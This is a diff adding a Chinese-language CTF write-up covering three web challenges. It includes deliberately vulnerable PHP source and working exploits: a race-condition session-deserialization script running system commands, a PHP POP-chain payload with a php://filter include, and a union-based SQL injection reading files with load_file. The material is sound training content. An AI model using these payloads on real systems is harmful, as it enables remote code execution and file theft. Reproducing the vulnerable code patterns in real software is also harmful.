@@ -689,3 +689,307 @@ for i in range(10):
 flag 在 /var 目录下
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201137228.png)
+
+## Week4
+
+### unf1ni3hed_web3he1
+
+题目前面有点谜语人了...
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251810968.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251810011.png)
+
+给的 hint 提示要访问 `/t00llll.php` ...
+
+```php
+<?php
+error_reporting(0);
+
+if (!isset($_GET['include_'])) {
+    echo "使用工具的时候,要轻一点哦~";
+    show_source(__FILE__);
+}else{
+    $include_ = $_GET['include_'];
+}
+if (preg_match('/sess|tmp/i', $include_)) {
+    die("可恶涅,同样的方法怎么可能骗到本小姐两次!");
+}else if (preg_match('/sess|tmp|index|\~|\@|flag|g|\%|\^|\&|data|log/i', $include_)) {
+    die("呜呜呜,不可以包含这些奇奇怪怪的东西欸!!");
+}
+else @include($include_);
+
+?>
+```
+
+去包含原来的 webshell
+
+```
+http://43.143.7.127:28843/t00llll.php?include_=php://filter/read=convert.base64-encode/resource=Rea1web3he11.php
+```
+
+```php
+<?php 
+error_reporting(0);
+ini_set('session.serialize_handler', 'php');
+session_start();
+echo "y0u_m4ybe_n3ed_s0me_t00llll_t0_u4_1t!"."<br>";
+
+class webshell{
+    public $caution;
+    public $execution;
+
+    function __construct(){
+        $this -> caution = new caution();
+    }
+
+    function __destruct(){
+        $this -> caution -> world_execute();
+    }
+    function exec(){
+        @eval($execution);
+    }
+}
+class caution{
+    function world_execute(){
+        echo "Webshell初&#%始*$%&^化,$))(&*(%#^**ERROR**#@$()"."<br>";
+    }
+}
+class execution{
+    public $cmd;
+    function __construct(){
+        $this -> cmd = 'echo "即将执行命令:".$cmd;';
+    }
+    function world_execute(){
+        eval($this -> cmd);
+    }
+}
+?>
+```
+
+很明显是 session 反序列化, payload 如下
+
+```php
+<?php
+class webshell{
+    public $caution;
+}
+
+class execution{
+    public $cmd;
+}
+
+$b = new execution();
+$b->cmd = 'system("ls -/");';
+
+$a = new webshell();
+$a->caution = $b;
+
+echo '|'.serialize($a);
+```
+
+反序列化的时候需要利用到 session\_upload\_progress, 但是提交的时候发现并没有执行对应的命令
+
+估计是 `session.upload_progress.cleanup` 被设置成了 `On`, session 清空导致来不及反序列化
+
+解决方法就是利用条件竞争, 在 post 表单的同时携带相同 PHPSESSID 的 cookie 去访问这个 webshell
+
+脚本如下
+
+```python
+import threading
+import requests
+
+url = 'http://43.143.7.127:28843/Rea1web3he11.php'
+flag = 'aaa'
+
+cmd = "system('cat /secret/flag');"
+
+payload = r'|O:8:"webshell":1:{s:7:"caution";O:9:"execution":1:{s:3:"cmd";s:' + str(len(cmd)) + ':"' + cmd + '";}}'
+
+def upload():
+    files = [
+        ('file', ('xx.txt', 'xxx'*10240)),
+    ]
+    data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}
+
+    while True:
+        res = requests.post(url, data=data, files=files, cookies={'PHPSESSID': flag})
+        print('upload',res.text)
+
+def write():
+    while True:
+        res = requests.get(url, cookies={'PHPSESSID': flag})
+        print('write',res.text)
+
+for i in range(10):
+    t1 = threading.Thread(target=upload)
+    t2 = threading.Thread(target=write)
+    t1.start()
+    t2.start()
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251818510.png)
+
+### pop子和pipi美
+
+这题也挺谜语的... 先要传参番号才会显示源码
+
+```
+http://43.143.7.97:28778/?pop_EP=ep683045
+```
+
+```php
+<?php
+error_reporting(0);
+//flag is in f14g.php
+class Popuko {
+    private $No_893;
+    public function POP_TEAM_EPIC(){
+        $WEBSITE  = "MANGA LIFE WIN";
+    }
+    public function __invoke(){
+        $this->append($this->No_893);
+    }
+    public function append($anti_takeshobo){
+        include($anti_takeshobo);
+    }
+}
+
+class Pipimi{
+    
+    public $pipi;
+    public function PIPIPMI(){
+        $h = "超喜欢POP子ww,你也一样对吧(举刀)";
+    }
+    public function __construct(){
+        echo "Pipi美永远不会生气ww";
+        $this->pipi = array();
+    }
+
+    public function __get($corepop){
+        $function = $this->p;
+        return $function();
+    }
+}
+class Goodsisters{
+
+    public function PopukoPipimi(){
+        $is = "Good sisters";
+    }
+
+    public $kiminonawa,$str;
+
+    public function __construct($file='index.php'){
+        $this->kiminonawa = $file;
+        echo 'Welcome to HNCTF2022 ,';
+        echo 'This is '.$this->kiminonawa."<br>";
+    }
+    public function __toString(){
+        return $this->str->kiminonawa;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i", $this->kiminonawa)) {
+            echo "仲良ピース!";
+            $this->kiminonawa = "index.php";
+        }
+    }
+}
+
+if(isset($_GET['pop'])) @unserialize($_GET['pop']);  
+
+else{
+    $a=new Goodsisters;
+    if(isset($_GET['pop_EP']) && $_GET['pop_EP'] == "ep683045"){
+        highlight_file(__FILE__);
+        echo '欸嘿,你也喜欢pop子~对吧ww';
+    }
+}
+```
+
+简单 pop 链构造
+
+```php
+<?php
+
+class Popuko {
+    public $No_893;
+}
+
+class Pipimi{
+    public $pipi;
+}
+
+class Goodsisters{
+    public $kiminonawa,$str;
+}
+
+$d = new Popuko();
+$d->No_893 = 'php://filter/read=convert.base64-encode/resource=f14g.php';
+
+$c = new Pipimi();
+$c->p = $d;
+
+$b = new Goodsisters();
+$b->str = $c;
+
+$a = new Goodsisters();
+$a->kiminonawa = $b;
+
+echo serialize($a);
+```
+
+### fun_sql
+
+```php
+<?
+include "mysql.php";
+include "flag.php";
+
+if ( $_GET['uname'] != '' && isset($_GET['uname'])) {
+
+    $uname=$_GET['uname'];
+
+    if(preg_match("/regexp|left|extractvalue|floor|reverse|update|between|flag|=|>|<|and|\||right|substr|replace|char|&|\\\$|0x|sleep|\#/i",$uname)){
+        die('hacker');
+        
+    }
+    
+    $sql="SELECT * FROM ccctttfff WHERE uname='$uname';";
+    echo "$sql<br>";
+    
+
+    mysqli_multi_query($db, $sql);
+    $result = mysqli_store_result($db);
+    $row = mysqli_fetch_row($result);
+
+    echo "<br>";
+
+    echo "<br>";
+    if (!$row) {
+        die("something wrong");
+    }
+    else
+    {
+        print_r($row);
+        echo $row['uname']."<br>";
+        
+    }
+    if ($row[1] === $uname)
+    {
+    die($flag);
+    }
+}
+highlight_file(__FILE__);
+```
+
+多句执行好像不能用, 只能 union 查询...
+
+直接用 load_file() 读取 flag.php
+
+```
+http://43.142.108.3:28436/?uname=123' union select 1,load_file(concat('/var/www/html/fla','g.php')),3; --+
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251054165.png)
